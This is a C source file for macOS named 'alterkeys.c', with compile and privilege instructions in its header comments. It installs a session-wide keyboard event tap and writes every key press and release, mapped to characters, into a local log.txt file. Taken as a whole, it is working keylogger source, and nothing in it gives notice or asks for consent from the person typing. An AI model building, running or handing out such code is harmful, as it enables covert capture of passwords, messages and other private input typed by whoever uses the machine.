// Complile using the following command line:
//     gcc -Wall -o alterkeys alterkeys.c -framework ApplicationServices
//
// You need superuser privileges to create the event tap, unless accessibility
// is enabled. To do so, select the "Enable access for assistive devices"
// checkbox in the Universal Access system preference pane.

#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>
#include <string.h>
char key_convert(CGKeyCode keycode);
FILE *fp = NULL;

// This callback will be invoked every time there is a keystroke
/**
 * Callback function for a Core Graphics event.
 *
 * @param event The Core Graphics event.
 *
 * @returns None
 */
CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    // Paranoid sanity check.
    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp))
        return event;

    // The incoming keycode.
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    
    
    char c = key_convert(keycode);

    fflush(fp);
    fprintf(fp, "%c", c);
    
    // Set the modified keycode field in the event.
    CGEventSetIntegerValueField(event, kCGKeyboardEventKeycode, (int64_t)keycode);

    // We must return the event for it to be useful.
    
    return event;
}

int main(void)
{
    fp= fopen("log.txt", "a"); //open for appending to file
    CFMachPortRef      eventTap;
    CGEventMask        eventMask;
    CFRunLoopSourceRef runLoopSource;
    

    // Create an event tap. We are interested in key presses.
    eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventKeyUp));
    eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, myCGEventCallback, NULL);
    if (!eventTap) {
        fprintf(stderr, "failed to create event tap\n");
        exit(1);
    }

    // Create a run loop source.
    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);

    // Add to the current run loop.
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource,kCFRunLoopCommonModes);

    // Enable the event tap.
    CGEventTapEnable(eventTap, true);

    // Set it all running.
    CFRunLoopRun();

    // In a real program, one would have arranged for cleaning up.
    fclose(fp);
    exit(0);
}
/* Convert the applescript key codes into single lowercase character 

    ? - unknown character
    < - delete key
*/
/**
 * Converts a key from one format to another.
 *
 * @param key The key to be converted.
 *
 * @returns The converted key.
 */
char key_convert(CGKeyCode keycode){
    switch(keycode){
			case (CGKeyCode)0:
				return 'a';
            case (CGKeyCode)11:
                return 'b';
            case (CGKeyCode)8:
                return 'c';
            case (CGKeyCode)2:
                return 'd';
            case (CGKeyCode)14:
                return 'e';
            case (CGKeyCode)3:
                return 'f';
            case (CGKeyCode)5:
                return 'g';
            case (CGKeyCode)4:
                return 'h';
            case (CGKeyCode)34:
                return 'i';
            case (CGKeyCode)38:
                return 'j';
            case (CGKeyCode)40:
                return 'k';
            case (CGKeyCode)37:
                return 'l';
            case (CGKeyCode)46:
                return 'm';
            case (CGKeyCode)45:
                return 'n';
            case (CGKeyCode)31:
                return 'o';
            case (CGKeyCode)35:
                return 'p';
            case (CGKeyCode)12:
                return 'q';
            case (CGKeyCode)15:
                return 'r';
            case (CGKeyCode)1:
                return 's';
            case (CGKeyCode)17:
                return 't';
            case (CGKeyCode)32:
                return 'u';
            case (CGKeyCode)9:
                return 'v';
            case (CGKeyCode)13:
                return 'w';
            case (CGKeyCode)7:
                return 'x';
            case (CGKeyCode)16:
                return 'y';
            case (CGKeyCode)6:
                return 'z';
            case (CGKeyCode)29:
                return '0';
            case (CGKeyCode)18:
                return '1';
            case (CGKeyCode)19:
                return '2';
            case (CGKeyCode)20:
                return '3';
            case (CGKeyCode)21:
                return '4';
            case (CGKeyCode)23:
                return '5';
            case (CGKeyCode)22:
                return '6';
            case (CGKeyCode)26:
                return '7';
            case (CGKeyCode)28:
                return '8';
            case (CGKeyCode)25:
                return '9';
            case (CGKeyCode)49:
                return ' ';
            case (CGKeyCode)51:
                return '<';
            case (CGKeyCode)57:
                return '^';
            case (CGKeyCode)76:
                return '-';
            case (CGKeyCode)36:
                return '-';
            default :
                return '?';
		}
}
